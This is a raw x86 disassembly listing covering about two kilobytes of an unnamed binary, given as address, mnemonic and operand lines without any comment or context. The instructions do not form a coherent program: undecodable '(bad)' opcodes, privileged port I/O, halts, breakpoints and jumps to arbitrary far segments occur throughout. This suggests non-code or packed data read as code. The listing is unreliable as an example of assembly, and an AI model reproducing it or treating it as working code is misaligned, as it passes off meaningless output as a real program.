  41d3bb:	xlat   BYTE PTR ds:[ebx]
  41d3bc:	scas   al,BYTE PTR es:[edi]
  41d3bd:	pop    edi
  41d3be:	mov    al,ds:0x5b154598
  41d3c3:	stos   BYTE PTR es:[edi],al
  41d3c4:	push   edi
  41d3c5:	push   cs
  41d3c6:	or     al,0xb0
  41d3c8:	jg     0x41d36f
  41d3ca:	nop
  41d3cb:	ss mov eax,0x7d9fbbcc
  41d3d1:	addr16 sub al,0x3e
  41d3d4:	and    BYTE PTR [edi+eiz*2],ch
  41d3d7:	fiadd  DWORD PTR [eax+ecx*4+0x74]
  41d3db:	add    edx,DWORD PTR [ebp-0x96cdb09]
  41d3e1:	mov    ds:0xfac5950a,al
  41d3e6:	ins    DWORD PTR es:[edi],dx
  41d3e7:	nop
  41d3e8:	(bad)  
  41d3ea:	lods   al,BYTE PTR ds:[esi]
  41d3eb:	and    al,dl
  41d3ed:	xchg   ebp,eax
  41d3ee:	sahf   
  41d3ef:	ds int3 
  41d3f1:	sub    edx,DWORD PTR [edi+0x74]
  41d3f4:	sub    edx,esi
  41d3f6:	mov    al,ds:0x88b13d17
  41d3fb:	and    dl,BYTE PTR [eax-0x3f0e2030]
  41d401:	ror    BYTE PTR ss:[edx],cl
  41d404:	pop    ecx
  41d405:	fdivrp st(6),st
  41d407:	ret    
  41d408:	cli    
  41d409:	xchg   esp,eax
  41d40a:	pop    ebp
  41d40b:	dec    edi
  41d40c:	add    eax,0xc470892d
  41d411:	and    al,0xc5
  41d413:	inc    edi
  41d415:	mov    al,ds:0x6e279f87
  41d41a:	cmp    eax,0x6e21d16b
  41d41f:	cmp    eax,DWORD PTR es:[edi+0x1]
  41d423:	sub    BYTE PTR [eax+0x1ea76fde],al
  41d429:	lods   al,BYTE PTR ds:[esi]
  41d42a:	cmp    ecx,DWORD PTR [eax-0x5a44d9b0]
  41d430:	lea    ecx,[esi]
  41d432:	loope  0x41d3e1
  41d434:	dec    ecx
  41d435:	push   ebx
  41d436:	bound  esp,QWORD PTR [eax+0x7d8d5645]
  41d43c:	(bad)  
  41d43d:	xor    al,0x51
  41d43f:	jle    0x41d48c
  41d441:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d442:	imul   eax,DWORD PTR [ecx-0x291c78ca],0x54
  41d449:	cmp    cl,BYTE PTR [ecx]
  41d44b:	(bad)  
  41d44d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d44e:	mov    eax,ds:0x2479b6e8
  41d453:	jbe    0x41d3fc
  41d455:	test   BYTE PTR [esi-0x2b8b6859],cl
  41d45b:	and    DWORD PTR [edi],0x312107c9
  41d461:	sbb    DWORD PTR [esi-0x37],0xffffffde
  41d465:	jecxz  0x41d45e
  41d467:	xchg   ebp,eax
  41d468:	or     dh,cl
  41d46a:	add    BYTE PTR [edi-0x45],dl
  41d46d:	outs   dx,BYTE PTR ds:[esi]
  41d46e:	sbb    cl,bl
  41d470:	push   0x34
  41d472:	sbb    BYTE PTR [esi-0x24],dh
  41d475:	mov    edx,0xa97cc05c
  41d47a:	add    BYTE PTR [edi-0x10],dl
  41d47d:	xchg   edi,eax
  41d47e:	push   ebx
  41d47f:	(bad)  
  41d480:	pop    eax
  41d481:	dec    esi
  41d482:	fisubr DWORD PTR [eax]
  41d484:	daa    
  41d485:	jnp    0x41d49d
  41d487:	or     ch,BYTE PTR [eax+0x5408c17f]
  41d48d:	sub    cl,cl
  41d48f:	jmp    0xa85ac851
  41d494:	add    esi,DWORD PTR [ebx+0x338f9ec9]
  41d49a:	call   0xd37e54e5
  41d49f:	in     eax,0x68
  41d4a1:	int3   
  41d4a2:	ret    0xc5a8
  41d4a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4a6:	scas   eax,DWORD PTR es:[edi]
  41d4a7:	xor    BYTE PTR [edi+0x64375c38],ch
  41d4ad:	mov    ds:0x629b7d2b,eax
  41d4b2:	pop    ds
  41d4b3:	iret   
  41d4b4:	add    al,BYTE PTR [esi]
  41d4b6:	or     ch,ch
  41d4b8:	rol    BYTE PTR [edx+0x31],0x66
  41d4bc:	push   edx
  41d4bd:	mov    BYTE PTR [eax-0xa],ch
  41d4c0:	sub    al,0x23
  41d4c2:	cmp    al,0x4a
  41d4c4:	xor    ch,BYTE PTR [eax]
  41d4c6:	cmp    ebp,ebp
  41d4c8:	xchg   esi,eax
  41d4c9:	test   eax,0x86d10130
  41d4ce:	imul   ecx,esp,0xffffff98
  41d4d1:	xchg   ecx,eax
  41d4d2:	scas   eax,DWORD PTR es:[edi]
  41d4d3:	aam    0xfa
  41d4d5:	cmp    BYTE PTR [esi+0x1c5a2f6],bl
  41d4db:	lea    ebp,[ecx]
  41d4dd:	mov    BYTE PTR [ebx-0x6],ch
  41d4e0:	add    BYTE PTR [edx+0x5b345867],dl
  41d4e6:	int3   
  41d4e7:	mov    al,ds:0x50f0f2da
  41d4ec:	in     eax,dx
  41d4ed:	mov    ch,0x27
  41d4ef:	push   ds
  41d4f0:	push   ds
  41d4f1:	daa    
  41d4f2:	mov    al,ds:0x2e97fe5
  41d4f7:	out    dx,eax
  41d4f8:	and    al,0x15
  41d4fa:	sbb    al,0xe1
  41d4fc:	fist   DWORD PTR [eax-0x43eee43b]
  41d502:	mov    cl,BYTE PTR [ecx]
  41d504:	hlt    
  41d505:	fld    TBYTE PTR [ecx+eiz*1+0x5]
  41d509:	dec    ecx
  41d50a:	inc    ebp
  41d50b:	adc    eax,0xbd83f362
  41d510:	cmp    ah,bl
  41d512:	mov    ecx,0x54c6e89c
  41d517:	enter  0x6482,0x1f
  41d51b:	dec    edx
  41d51c:	mov    edi,0xeefb19a
  41d521:	hlt    
  41d522:	sub    edi,ebp
  41d524:	cmp    BYTE PTR [edx+0x2a],ch
  41d527:	push   es
  41d528:	data16 loopne 0x41d538
  41d52b:	loop   0x41d50e
  41d52d:	push   0xef265365
  41d532:	adc    DWORD PTR [edi],0x32395475
  41d538:	sbb    edx,DWORD PTR [ebp-0xd3189dd]
  41d53e:	push   0xab448278
  41d543:	call   0x468d:0x12e90114
  41d54a:	out    0xf5,eax
  41d54c:	fs jl  0x41d556
  41d54f:	hlt    
  41d550:	int    0xcc
  41d552:	cmp    eax,0x25f9fb2a
  41d557:	jmp    0x96e46397
  41d55c:	dec    eax
  41d55d:	call   0xe955:0xeb853818
  41d564:	adc    DWORD PTR [edx+0x21],esp
  41d567:	or     DWORD PTR [ebp+esi*2+0x40],edx
  41d56b:	xchg   esp,eax
  41d56c:	in     eax,0x37
  41d56e:	or     al,0x8
  41d570:	sbb    ah,BYTE PTR [ebx+0x61d8e1e3]
  41d576:	int3   
  41d577:	stos   BYTE PTR es:[edi],al
  41d578:	push   0xa
  41d57a:	ins    DWORD PTR es:[edi],dx
  41d57b:	jle    0x41d589
  41d57d:	jecxz  0x41d530
  41d57f:	ins    DWORD PTR es:[edi],dx
  41d580:	pop    eax
  41d581:	sub    eax,0x5c167662
  41d586:	cmp    BYTE PTR [eax],ah
  41d588:	or     al,0x37
  41d58a:	hlt    
  41d58b:	mov    dl,0xb2
  41d58d:	and    eax,0x5dc1af35
  41d592:	cmp    edi,DWORD PTR cs:[ebp+0x6a46d0b0]
  41d599:	push   ss
  41d59a:	lds    esi,FWORD PTR [ecx-0xbae1862]
  41d5a0:	mov    ds:0x2fb937a9,eax
  41d5a5:	cli    
  41d5a6:	adc    ebp,esi
  41d5a8:	aad    0x4c
  41d5aa:	inc    ebp
  41d5ab:	and    ebp,DWORD PTR [esi]
  41d5ad:	js     0x41d5a3
  41d5af:	mov    edi,0x60a633ad
  41d5b4:	cmp    al,0x71
  41d5b6:	popf   
  41d5b7:	call   0x593dbf0f
  41d5bc:	fs mov cl,0x78
  41d5bf:	dec    ebx
  41d5c0:	mov    ebp,0x2cb5ac92
  41d5c5:	cmp    cl,BYTE PTR [edx-0x4e]
  41d5c8:	mov    dh,bh
  41d5ca:	xchg   DWORD PTR [ebx],esi
  41d5cc:	jmp    0x41d639
  41d5ce:	fld    DWORD PTR [edx]
  41d5d0:	xor    al,bh
  41d5d2:	dec    edx
  41d5d3:	(bad)  
  41d5d4:	popf   
  41d5d5:	ss (bad) 
  41d5d7:	ja     0x41d5fa
  41d5d9:	fwait
  41d5da:	mov    eax,0xa8d9866b
  41d5df:	ins    DWORD PTR es:[edi],dx
  41d5e0:	xchg   ebx,eax
  41d5e1:	push   ebx
  41d5e2:	xchg   ebx,eax
  41d5e3:	and    ecx,edx
  41d5e5:	pop    esp
  41d5e6:	in     al,dx
  41d5e7:	dec    ebx
  41d5e8:	bound  esp,QWORD PTR [ecx-0x60]
  41d5eb:	(bad)  
  41d5ec:	cwde   
  41d5ed:	pop    DWORD PTR [esi+0x2]
  41d5f0:	and    DWORD PTR [esi],esp
  41d5f2:	add    DWORD PTR [esi-0x29],0x7e
  41d5f6:	jge    0x9a5f2ef0
  41d5fc:	pop    ebx
  41d5fd:	nop
  41d5fe:	not    esi
  41d600:	arpl   WORD PTR [edi],bx
  41d602:	push   ebx
  41d603:	ret    0xe00c
  41d606:	ror    edi,0xfd
  41d609:	pop    edx
  41d60a:	lods   al,BYTE PTR ds:[esi]
  41d60b:	inc    edx
  41d60c:	jnp    0x41d662
  41d60e:	dec    ebp
  41d60f:	je     0x41d62c
  41d611:	test   al,0xc7
  41d613:	(bad)  
  41d614:	adc    ebp,DWORD PTR [esi-0x3fe7887]
  41d61a:	js     0x41d693
  41d61c:	mov    dl,0xd9
  41d61e:	fld    TBYTE PTR [ebx+0x1dccdd72]
  41d624:	dec    ecx
  41d625:	stos   DWORD PTR es:[edi],eax
  41d626:	push   ebp
  41d627:	add    bh,bh
  41d629:	push   cs
  41d62a:	aaa    
  41d62b:	sahf   
  41d62c:	ja     0x41d634
  41d62e:	aas    
  41d62f:	cmp    ah,BYTE PTR [edi-0x1f]
  41d632:	test   al,0x91
  41d634:	cld    
  41d635:	mov    cl,bl
  41d637:	pop    edx
  41d638:	mov    dh,0xa7
  41d63a:	das    
  41d63b:	inc    edx
  41d63c:	aam    0x32
  41d63e:	sbb    ah,BYTE PTR [ebx]
  41d640:	data16 arpl WORD PTR [ecx+0x79289e7c],di
  41d647:	ds addr16 dec esp
  41d64a:	or     eax,0x8cf543f6
  41d64f:	add    ch,0xbf
  41d652:	clc    
  41d653:	jg     0x41d680
  41d655:	adc    al,0x6
  41d657:	adc    BYTE PTR [edx+esi*8+0x49],cl
  41d65b:	(bad)  
  41d65c:	fstp   QWORD PTR [edi-0x64a580bb]
  41d662:	xchg   edi,eax
  41d663:	xor    ecx,DWORD PTR [edx-0x41]
  41d666:	lock lea ecx,[edi+0x5e8fb266]
  41d66d:	sbb    eax,0xa72fffa6
  41d672:	cmp    cl,BYTE PTR [ecx]
  41d674:	mov    ebx,0xad4e77c8
  41d679:	xor    esi,ebp
  41d67b:	cmp    dl,BYTE PTR [ebp-0x6c]
  41d67e:	sbb    eax,0x2782ece1
  41d683:	hlt    
  41d684:	dec    esi
  41d685:	aas    
  41d686:	sub    al,0xb1
  41d688:	je     0x41d675
  41d68a:	ffreep st(7)
  41d68c:	stos   BYTE PTR es:[edi],al
  41d68d:	cwde   
  41d68e:	(bad)  
  41d68f:	or     DWORD PTR [ecx-0x27bbe65f],edi
  41d695:	neg    BYTE PTR [ebx-0x26]
  41d698:	sbb    bh,BYTE PTR [eax+0x40]
  41d69b:	and    DWORD PTR [ecx+esi*4-0x37],0x29607cb4
  41d6a3:	ds dec edx
  41d6a5:	dec    edx
  41d6a6:	gs mov al,0x8a
  41d6a9:	push   0xa36e83e8
  41d6ae:	xchg   ecx,eax
  41d6af:	mov    al,ds:0x41c3399a
  41d6b4:	out    dx,eax
  41d6b5:	inc    edx
  41d6b6:	mov    dh,0xb0
  41d6b8:	adc    al,0x4e
  41d6ba:	add    esp,DWORD PTR [esi-0x6f]
  41d6bd:	xor    BYTE PTR ds:0x5dba20ba,dh
  41d6c3:	or     al,0x1c
  41d6c5:	add    bh,BYTE PTR [ebx+0x2a]
  41d6c8:	or     ebx,edi
  41d6ca:	push   edx
  41d6cb:	fmul   st,st(5)
  41d6cd:	add    esi,DWORD PTR [ecx+0x73]
  41d6d0:	pop    ebx
  41d6d1:	ret    
  41d6d2:	push   esp
  41d6d3:	into   
  41d6d4:	mov    bh,0x19
  41d6d6:	sahf   
  41d6d7:	dec    DWORD PTR [ecx+0x24f0d49f]
  41d6dd:	test   BYTE PTR [ecx],al
  41d6df:	pop    es
  41d6e0:	retf   0x1163
  41d6e3:	xchg   sp,ax
  41d6e5:	push   esi
  41d6e6:	pop    es
  41d6e7:	call   0x9f92687d
  41d6ec:	push   es
  41d6ed:	xchg   esi,eax
  41d6ee:	dec    ecx
  41d6ef:	arpl   cx,cx
  41d6f1:	xor    al,0x15
  41d6f3:	je     0x41d764
  41d6f5:	test   bl,bh
  41d6f7:	hlt    
  41d6f8:	ftst   
  41d6fa:	dec    esi
  41d6fb:	aaa    
  41d6fc:	and    eax,ebx
  41d6fe:	aam    0x59
  41d700:	xchg   ecx,eax
  41d701:	aam    0xf3
  41d703:	std    
  41d704:	mov    ds:0xd8818805,al
  41d709:	popa   
  41d70a:	ds mov ch,0x11
  41d70d:	lds    edx,FWORD PTR ds:0x41fbfdf5
  41d713:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d714:	lods   al,BYTE PTR ds:[esi]
  41d715:	loope  0x41d76c
  41d717:	ja     0x41d74b
  41d719:	sahf   
  41d71a:	stc    
  41d71b:	push   es
  41d71c:	nop
  41d71d:	pop    ebx
  41d71e:	mov    eax,0x44dd8af5
  41d723:	jnp    0x41d707
  41d725:	pusha  
  41d726:	mov    DWORD PTR [ebx+0xad6e48f],ecx
  41d72c:	nop
  41d72d:	cmp    BYTE PTR [edx-0x80],bh
  41d730:	test   DWORD PTR [ecx+0x7b],ebx
  41d733:	adc    edi,DWORD PTR [edi-0x3a1d3453]
  41d739:	xchg   DWORD PTR [esi-0x446f07c9],edi
  41d73f:	popf   
  41d740:	xchg   esi,eax
  41d741:	cmp    BYTE PTR [edx-0x1ae8fde7],ah
  41d747:	(bad)  
  41d748:	popf   
  41d749:	inc    ebx
  41d74a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d74b:	(bad)  
  41d74c:	nop
  41d74d:	jmp    0xe952:0x175c2cc3
  41d754:	mov    ecx,0x17db0c7d
  41d759:	adc    DWORD PTR [ebp+0x6c],ebx
  41d75c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d75d:	sbb    bh,cl
  41d75f:	lock enter 0x1388,0xee
  41d764:	imul   esp,DWORD PTR [edx-0x59],0x318f8e6a
  41d76b:	push   cs
  41d76c:	in     al,0xe6
  41d76e:	xchg   esi,eax
  41d76f:	out    dx,eax
  41d770:	inc    edx
  41d771:	inc    ecx
  41d772:	ins    BYTE PTR es:[edi],dx
  41d773:	addr16 hlt 
  41d775:	aaa    
  41d776:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d777:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d778:	div    BYTE PTR [esi]
  41d77a:	ds xchg ebx,eax
  41d77c:	in     al,0xfd
  41d77e:	dec    ecx
  41d77f:	shl    ecx,0x84
  41d782:	dec    ecx
  41d783:	cmp    DWORD PTR [edi],0xc1f58192
  41d789:	je     0x41d731
  41d78b:	outs   dx,BYTE PTR ds:[esi]
  41d78c:	jmp    0x5a9c7ab9
  41d791:	jecxz  0x41d792
  41d793:	push   ss
  41d794:	jmp    0x83a7:0x6713f956
  41d79b:	leave  
  41d79c:	push   es
  41d79d:	cmc    
  41d79e:	mov    ebp,0x727bb61c
  41d7a3:	shl    BYTE PTR [eiz*2-0x198e96e0],0x6d
  41d7ab:	ret    0x172e
  41d7ae:	or     DWORD PTR [edx],0xa398937f
  41d7b4:	sahf   
  41d7b5:	sub    DWORD PTR [esi+0x19],esp
  41d7b8:	add    DWORD PTR [edx+0x486c86b1],esp
  41d7be:	xchg   ebx,eax
  41d7bf:	sub    cl,ch
  41d7c1:	out    0x80,al
  41d7c3:	xchg   esp,eax
  41d7c4:	dec    edx
  41d7c5:	out    0x33,eax
  41d7c7:	adc    esi,DWORD PTR [esi]
  41d7c9:	repnz fnstenv ds:0x751ce341
  41d7d0:	leave  
  41d7d1:	das    
  41d7d2:	inc    esp
  41d7d3:	ficom  DWORD PTR [edi]
  41d7d5:	stc    
  41d7d6:	stos   BYTE PTR es:[edi],al
  41d7d7:	push   esp
  41d7d8:	scas   al,BYTE PTR es:[edi]
  41d7d9:	mov    ebp,esp
  41d7db:	stos   DWORD PTR es:[edi],eax
  41d7dc:	jecxz  0x41d7d2
  41d7de:	mov    bh,0x24
  41d7e0:	shl    BYTE PTR [ecx+eiz*1-0x18],0x2b
  41d7e5:	es pop ds
  41d7e7:	mov    BYTE PTR [ebx+0x62251d3b],cl
  41d7ed:	repnz xchg ebx,eax
  41d7ef:	ins    DWORD PTR es:[edi],dx
  41d7f0:	xchg   ebp,eax
  41d7f1:	jle    0x41d7f6
  41d7f3:	loopne 0x41d7d4
  41d7f5:	xchg   esi,eax
  41d7f6:	dec    esi
  41d7f7:	pop    ss
  41d7f8:	gs into 
  41d7fa:	sbb    al,0xa9
  41d7fc:	jge    0x41d879
  41d7fe:	push   0xffffffb9
  41d800:	mov    ch,0x1e
  41d802:	push   ds
  41d803:	ret    
  41d804:	pop    ds
  41d805:	xchg   esp,eax
  41d806:	jmp    0xc1e842b6
  41d80b:	add    DWORD PTR [esi+0x1],esi
  41d80e:	jmp    0x3572f80f
  41d813:	daa    
  41d814:	shr    BYTE PTR [eax+0x31513b77],cl
  41d81a:	jmp    0x6e81063d
  41d81f:	inc    edx
  41d820:	sbb    edx,DWORD PTR [ecx+ecx*4-0x4e671911]
  41d827:	pop    ecx
  41d829:	push   eax
  41d82a:	xchg   ebx,eax
  41d82b:	xor    al,0x1b
  41d82d:	cmc    
  41d82e:	in     al,0x82
  41d830:	les    esi,FWORD PTR [ebx+ecx*1-0x21]
  41d834:	std    
  41d835:	jne    0x41d7d7
  41d837:	adc    bh,BYTE PTR [esi+eax*8]
  41d83a:	int3   
  41d83b:	cwde   
  41d83c:	lock or eax,ebx
  41d83f:	outs   dx,DWORD PTR ds:[esi]
  41d840:	mov    ds:0x7e989c5e,al
  41d845:	mov    ecx,DWORD PTR [esi-0x5c]
  41d848:	or     al,0x5a
  41d84a:	dec    eax
  41d84b:	ss in  eax,0x59
  41d84e:	and    BYTE PTR [eax-0x19],dl
  41d851:	inc    esi
  41d852:	mov    edi,0x4bb7825f
  41d857:	imul   edi,DWORD PTR [eax],0x71
  41d85a:	out    0x67,eax
  41d85c:	dec    ebx
  41d85d:	jb     0x41d83c
  41d85f:	lea    ebp,[bp+di-0x44]
  41d863:	test   bh,0x78
  41d866:	xor    DWORD PTR ds:0x939c777e,0xffffffd5
  41d86d:	mov    ch,0x18
  41d86f:	pop    esi
  41d870:	pop    edx
  41d871:	mov    ds:0xca344747,al
  41d876:	jmp    0xf76a:0x5359ccb0
  41d87d:	xor    dh,dh
  41d87f:	out    dx,eax
  41d880:	xor    BYTE PTR [esi-0x1001ae93],dl
  41d886:	add    eax,0x6a917d5f
  41d88b:	out    0x94,al
  41d88d:	retf   0x675e
  41d890:	popa   
  41d891:	loope  0x41d88b
  41d893:	fstp   DWORD PTR [ebp+esi*1-0x6f]
  41d897:	into   
  41d898:	fdivr  QWORD PTR [ebx-0x22]
  41d89b:	mov    al,ds:0x7b185223
  41d8a0:	push   sp
  41d8a2:	loope  0x41d8fa
  41d8a4:	jmp    0xbb28:0xc26b9dd5
  41d8ab:	scas   al,BYTE PTR es:[edi]
  41d8ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8ad:	inc    esi
  41d8ae:	dec    edi
  41d8af:	push   eax
  41d8b0:	xor    al,0xb8
  41d8b2:	idiv   al
  41d8b4:	lods   eax,DWORD PTR ds:[esi]
  41d8b5:	test   BYTE PTR [esi+0x70],bh
  41d8b8:	sbb    esp,eax
  41d8ba:	add    ebp,DWORD PTR [esi-0x49]
  41d8bd:	retf   0x3ac0
  41d8c0:	test   BYTE PTR [edx],cl
  41d8c2:	jecxz  0x41d915
  41d8c4:	pop    ds
  41d8c5:	in     al,dx
  41d8c6:	push   0xb0ffdb60
  41d8cb:	rcr    BYTE PTR [ecx],cl
  41d8cd:	cmc    
  41d8ce:	xchg   esi,eax
  41d8cf:	push   0x77ddf62f
  41d8d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8d5:	mov    edi,0xe6cf00d4
  41d8da:	cmp    DWORD PTR [edx+0x2d],0xa6c73d03
  41d8e1:	iret   
  41d8e2:	add    ecx,0xffffffc9
  41d8e5:	sbb    BYTE PTR [ebx+0x1d],bl
  41d8e8:	lds    ebp,FWORD PTR [edx-0x29]
  41d8eb:	bound  ebp,QWORD PTR [ebx]
  41d8ed:	nop
  41d8ee:	les    edi,FWORD PTR [ebp+eax*2-0x8d4f307]
  41d8f5:	rcr    BYTE PTR [edi-0x8],1
  41d8f8:	mov    DWORD PTR [eax-0x3188fdb],esp
  41d8fe:	add    DWORD PTR ds:0x3d69fcf6,0x14
  41d905:	jmp    0x99d4445e
  41d90a:	xchg   ebx,eax
  41d90b:	in     al,0x8a
  41d90d:	push   0xffffffc7
  41d90f:	cmp    DWORD PTR [ecx],0x70fe2d41
  41d915:	adc    BYTE PTR [ebx],cl
  41d917:	out    dx,eax
  41d918:	scas   al,BYTE PTR es:[edi]
  41d919:	pushf  
  41d91a:	mov    WORD PTR [edx],cs
  41d91c:	or     DWORD PTR [esi],ecx
  41d91e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d91f:	mov    ebp,0xd4fee4d5
  41d924:	pshufw mm7,QWORD PTR [ebx-0x3c],0xe9
  41d929:	pop    edi
  41d92a:	ja     0x41d901
  41d92c:	add    DWORD PTR [ecx],0x3d
  41d92f:	stos   DWORD PTR es:[edi],eax
  41d930:	fyl2x  
  41d932:	mov    al,ds:0x2d68dcaf
  41d937:	scas   al,BYTE PTR es:[edi]
  41d938:	add    DWORD PTR [edx],eax
  41d93a:	fisttp WORD PTR [ecx+0x7f82d47e]
  41d940:	mov    ecx,0xd01dd0fa
  41d945:	(bad)  
  41d946:	mov    ch,0x18
  41d948:	clc    
  41d949:	mov    ch,0x1a
  41d94b:	scas   eax,DWORD PTR es:[di]
  41d94d:	(bad)  
  41d94e:	jge    0x41d8d3
  41d950:	sbb    al,0x3e
  41d952:	out    dx,eax
  41d953:	pop    edi
  41d954:	adc    esp,ecx
  41d956:	(bad)  
  41d957:	adc    ebx,DWORD PTR [ecx-0x2c]
  41d95a:	pop    edx
  41d95b:	dec    ebp
  41d95c:	inc    edi
  41d95d:	adc    cl,BYTE PTR [ebx]
  41d95f:	inc    edi
  41d960:	xor    ecx,DWORD PTR [edx+0x2f7d37d2]
  41d966:	mov    ch,0xa1
  41d968:	sbb    eax,0x6778fd4a
  41d96d:	or     DWORD PTR [eax+0x30],ebp
  41d970:	sub    DWORD PTR [ebx-0x4f],ebp
  41d973:	icebp  
  41d974:	(bad)  
  41d975:	fcom   st(3)
  41d977:	mov    ch,0x6c
  41d979:	mov    ch,0x4b
  41d97b:	cdq    
  41d97c:	loope  0x41d99b
  41d97e:	js     0x41d984
  41d980:	sub    al,0xe
  41d982:	add    BYTE PTR [ebx+0x1e],cl
  41d985:	xor    al,0x0
  41d987:	adc    eax,DWORD PTR [ecx-0x7f]
  41d98a:	mov    ss,WORD PTR [eax+0x40]
  41d98d:	lds    ebp,FWORD PTR [esi+eiz*2+0x10]
  41d991:	aas    
  41d992:	ds fdivrp st(2),st
  41d995:	and    DWORD PTR [edx+0x17],edi
  41d998:	cwde   
  41d999:	fstp   TBYTE PTR [ecx]
  41d99b:	sbb    eax,DWORD PTR [esi+0x50116c8b]
  41d9a1:	int3   
  41d9a2:	addr16 retf 
  41d9a4:	add    al,0x23
  41d9a6:	pop    ss
  41d9a7:	or     al,0x97
  41d9a9:	xor    al,BYTE PTR [eax]
  41d9ab:	push   0x85528534
  41d9b0:	mov    DWORD PTR [ebx+0x21ec2f5c],edx
  41d9b6:	and    ebp,esp
  41d9b8:	xchg   edi,eax
  41d9b9:	sub    DWORD PTR [edi-0x6f],eax
  41d9bc:	inc    ebp
  41d9bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9be:	sahf   
  41d9bf:	call   0xe188df8d
  41d9c4:	lods   al,BYTE PTR ds:[esi]
  41d9c5:	jbe    0x41d965
  41d9c7:	in     al,0x15
  41d9c9:	xor    DWORD PTR [esi-0x36f88962],0xffffffd6
  41d9d0:	popa   
  41d9d1:	mov    al,0xf2
  41d9d3:	test   eax,0x8556b97d
  41d9d8:	add    BYTE PTR [eax],0x95
  41d9db:	pop    ecx
  41d9dc:	xlat   BYTE PTR ds:[ebx]
  41d9dd:	mov    al,0x18
  41d9df:	mov    al,0xfd
  41d9e1:	mov    ebx,0xebc16351
  41d9e6:	or     edi,0xa6444c9a
  41d9ec:	cli    
  41d9ed:	les    ecx,FWORD PTR [edx+0x27d6d66]
  41d9f3:	retf   
  41d9f4:	mov    DWORD PTR [edx],esi
  41d9f6:	outs   dx,DWORD PTR ds:[esi]
  41d9f7:	fnsave [ebp-0x209a786d]
  41d9fd:	sbb    edi,0xf9c0dc2d
  41da03:	adc    ebx,ebx
  41da05:	xchg   edi,eax
  41da06:	mov    ds:0x3e3a00b2,eax
  41da0b:	aas    
  41da0c:	sbb    DWORD PTR [ecx+0x5d],ebx
  41da0f:	mov    dh,0xb
  41da11:	hlt    
  41da12:	dec    esi
  41da13:	retf   
  41da14:	hlt    
  41da15:	add    esp,edi
  41da17:	out    0x88,al
  41da19:	inc    ecx
  41da1a:	fwait
  41da1b:	test   DWORD PTR [eax],edx
  41da1d:	call   0x6fba:0xbeeb3b24
  41da24:	stos   DWORD PTR es:[edi],eax
  41da25:	call   0xe28d06d6
  41da2a:	inc    eax
  41da2b:	jbe    0x41daa7
  41da2d:	loopne 0x41da8d
  41da2f:	xchg   ebx,eax
  41da30:	cmp    BYTE PTR [ecx],ch
  41da32:	out    0x17,al
  41da34:	lods   al,BYTE PTR ds:[esi]
  41da35:	in     al,0xf
  41da37:	(bad)  
  41da38:	jbe    0x41da36
  41da3a:	in     eax,0xaa
  41da3c:	inc    edi
  41da3d:	pushf  
  41da3e:	arpl   bx,cx
  41da40:	pop    esi
  41da41:	(bad)  
  41da42:	mov    eax,0x7cfcfe8d
  41da47:	mov    eax,0x5cb9467f
  41da4c:	scas   al,BYTE PTR es:[edi]
  41da4d:	pop    esi
  41da4e:	jmp    0xeecb052
  41da53:	not    BYTE PTR [ebx]
  41da55:	jb     0x41dab9
  41da57:	push   edx
  41da58:	or     bh,dl
  41da5a:	nop
  41da5b:	add    DWORD PTR [ebx],esp
  41da5d:	sbb    dh,BYTE PTR [eax+ecx*1]
  41da60:	pop    edx
  41da61:	mov    ah,0xaf
  41da63:	out    dx,eax
  41da64:	ds inc ebp
  41da66:	popf   
  41da67:	es pop edi
  41da69:	sbb    esp,DWORD PTR [ecx]
  41da6b:	mov    esi,0x7219937f
  41da70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da71:	outs   dx,DWORD PTR ds:[esi]
  41da72:	adc    eax,DWORD PTR [edx+0x18fbec6d]
  41da78:	data16 sbb BYTE PTR [edi],ch
  41da7b:	push   0xfffffffa
  41da7d:	or     DWORD PTR ss:[edi],esi
  41da80:	add    dl,BYTE PTR [edi-0x50c7c685]
  41da86:	fcom   DWORD PTR [ebp+0x75]
  41da89:	repz ficomp WORD PTR [edi]
  41da8c:	adc    BYTE PTR [ecx+0x48],bl
  41da8f:	ins    BYTE PTR es:[edi],dx
  41da90:	test   DWORD PTR [edx-0x2],ebp
  41da93:	xor    ah,BYTE PTR [ebx+0x7a]
  41da96:	fs es pop edx
  41da99:	jb     0x41db0c
  41da9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da9c:	mov    bh,0xf7
  41da9e:	mov    dh,0x66
  41daa0:	mov    ah,0x3a
  41daa2:	lods   al,BYTE PTR ds:[esi]
  41daa3:	mov    eax,0xa9ff70fe
  41daa8:	mov    ds:0x6f8c5fa2,al
  41daad:	daa    
  41daae:	(bad)
  41dab3:	ret    
  41dab4:	fldenv [edx+0x35218e7c]
  41daba:	pop    ss
  41dabb:	dec    eax
  41dabc:	call   0x91be:0x1bf4ed4b
  41dac3:	jmp    0x3980:0x76bf6c33
  41daca:	test   eax,0xd732c352
  41dacf:	sahf   
  41dad0:	call   0xfaab:0xc7908508
  41dad7:	out    dx,al
  41dad8:	in     eax,dx
  41dad9:	cmp    eax,DWORD PTR [eax-0x50]
  41dadc:	(bad)  
  41dadd:	js     0x41db14
  41dadf:	ja     0x41db46
  41dae1:	cs clc 
  41dae3:	mov    al,0x67
  41dae5:	jns    0x41db33
  41dae7:	iret   
  41dae8:	xchg   esp,eax
  41dae9:	ins    DWORD PTR es:[edi],dx
  41daea:	mov    dl,0xdd
  41daec:	dec    ebx
  41daed:	pushf  
  41daee:	mov    ebx,DWORD PTR [ebp-0x11]
  41daf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41daf2:	xor    ah,BYTE PTR [edi+0x78]
  41daf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41daf6:	lds    ecx,FWORD PTR [ebp+ecx*2-0x1c]
  41dafa:	sbb    bl,bl
  41dafc:	xchg   esi,eax
  41dafd:	sub    DWORD PTR [ebx+0xba4404d],esp
  41db03:	mov    ebx,0xa3806011
